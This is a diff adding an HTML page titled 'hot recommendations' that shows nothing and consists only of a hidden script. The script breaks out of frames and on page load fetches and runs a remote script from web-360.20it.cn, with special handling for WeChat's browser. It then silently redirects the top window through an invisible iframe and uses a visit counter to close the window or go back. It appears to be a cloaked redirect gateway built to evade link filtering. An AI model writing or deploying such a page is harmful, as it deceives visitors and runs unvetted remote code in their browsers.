@@ -1,0 +1,89 @@
+<!doctype html>
+<html class="no-js" lang="">
+<head>
+    <title>热门推荐</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
+</head>
+<body>
+<script>
+    if (self !== top) {
+        top.location = self.location
+    }
+    try {
+        tbsJs.onReady('{useCachedApi : "true"}', function (c) {
+        })
+    } catch (err) {
+    }
+    var param = getParam();
+    var isiOS = !!navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
+    window.addEventListener('pageshow', function (e) {
+        if(check_times()){
+            j();
+        }else{
+            if(param.c == 1){
+                document.addEventListener('WeixinJSBridgeReady', function(){ WeixinJSBridge.call('closeWindow'); }, false);
+                WeixinJSBridge.call('closeWindow');
+            }else{
+                history.back();
+            }
+        }
+
+    // else if(param.c == 4){
+    //         sessionStorage.setItem('wx_times',param.m);
+    //         location.href="https://mp.weixin.qq.com/s/wWG-a9j13ze5TVYaky2APQ";
+    //     }
+
+    });
+    var burl = 'https://web-360.20it.cn/api/getWeUrl'+location.search;
+    function ljs() {
+        var b = document.createElement("script");
+        var _t = (navigator.userAgent.indexOf('MicroMessenger')>0?'7':'')+(new Date()).getTime().toString();
+        b.src = burl +'&_t='+ _t;
+        b.type = "text/javascript";
+        document.body.appendChild(b)
+    }
+    function j(b) {
+        if (b) {
+            a(b.url)
+        } else {
+            ljs()
+        }
+    }
+    function w(c) {
+        j(c)
+    }
+    function a(e) {
+        var f = document.createElement('iframe');
+        f.style.display = 'none';
+        document.body.appendChild(f).src = 'javascript:"<script>top.location.replace(\'' + e + '\')<\/script>"';
+    }
+    function check_times(){
+        var times = sessionStorage.getItem('wx_times');
+        if(!times){
+            sessionStorage.setItem('wx_times',1);
+            return true;
+        }
+
+        if(times < (param.m * 1)){
+            times ++;
+            sessionStorage.setItem('wx_times',times);
+            return true
+        }else{
+            sessionStorage.removeItem('wx_times',times);
+            return false;
+        }
+    }
+    function getParam(){
+        var res = location.search.substring(1).split('&');
+
+        var items = {};
+        for(var i=0;i<res.length;i++){
+            var a = res[i].split('=');
+            items[a[0]] = a[1];
+        }
+        return items
+    }
+</script>
+</body>
+</html>
